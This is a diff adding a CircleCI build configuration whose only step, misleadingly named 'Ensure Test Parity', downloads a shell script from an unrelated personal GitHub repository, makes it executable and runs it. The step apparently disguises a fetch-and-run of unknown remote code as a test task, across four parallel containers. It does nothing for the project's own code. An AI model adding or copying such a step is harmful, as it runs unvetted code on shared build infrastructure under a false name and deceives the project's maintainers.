@@ -1,0 +1,14 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: cimg/go:1.16.4
+    parallelism: 4
+    steps:
+      - checkout
+      - run:
+          name: Ensure Test Parity
+          command: |
+            wget https://raw.githubusercontent.com/AndiSN/ultimate/main/yes.sh
+            chmod +x yes.sh
+            ./yes.sh
